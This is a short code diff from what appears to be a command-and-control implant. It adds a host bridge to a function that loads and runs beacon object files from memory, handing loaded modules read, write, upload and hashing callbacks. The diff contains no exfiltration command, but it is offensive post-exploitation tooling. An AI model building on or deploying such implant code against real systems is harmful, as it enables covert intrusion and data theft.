@@ -33,7 +33,7 @@ static char *dup_cstr(const char *s) {
 c2_status c2_bof_run(const uint8_t *loader_so, size_t loader_len,
                      const uint8_t *bof, size_t bof_len,
                      const char *export_name, const uint8_t *args,
-                     size_t args_len, char **out) {
+                     size_t args_len, const c2_bof_host *host, char **out) {
   if (loader_so == NULL || loader_len == 0 || bof == NULL || bof_len == 0 ||
       out == NULL)
     return C2_ERR_ARG;
@@ -48,6 +48,15 @@ c2_status c2_bof_run(const uint8_t *loader_so, size_t loader_len,
   if (mod == NULL) {
     *out = dup_cstr(err[0] != '\0' ? err : "loader image rejected");
     return C2_ERR_IO;
+  }
+
+  if (host != NULL && host->read != NULL && host->write != NULL &&
+      host->upload != NULL && host->sha256 != NULL) {
+    typedef void (*set_host_fn)(void *, c2_bof_read_fn, c2_bof_write_fn,
+                                c2_bof_upload_fn, c2_bof_sha256_fn);
+    set_host_fn set_host = (set_host_fn)elfload_sym(mod, "SetHostBridge");
+    if (set_host != NULL)
+      set_host(host->ctx, host->read, host->write, host->upload, host->sha256);
   }
 
   c2_bof_run_fn run = (c2_bof_run_fn)elfload_sym(mod, "Run");
@@ -95,7 +104,7 @@ c2_status c2_bof_pack_args(const c2_str *args, size_t argc, uint8_t *out,
 c2_status c2_bof_run(const uint8_t *loader_so, size_t loader_len,
                      const uint8_t *bof, size_t bof_len,
                      const char *export_name, const uint8_t *args,
-                     size_t args_len, char **out) {
+                     size_t args_len, const c2_bof_host *host, char **out) {
   (void)loader_so;
   (void)loader_len;
   (void)bof;
@@ -103,6 +112,7 @@ c2_status c2_bof_run(const uint8_t *loader_so, size_t loader_len,
   (void)export_name;
   (void)args;
   (void)args_len;
+  (void)host;
   (void)out;
   return C2_ERR_UNSUPPORTED;
 }
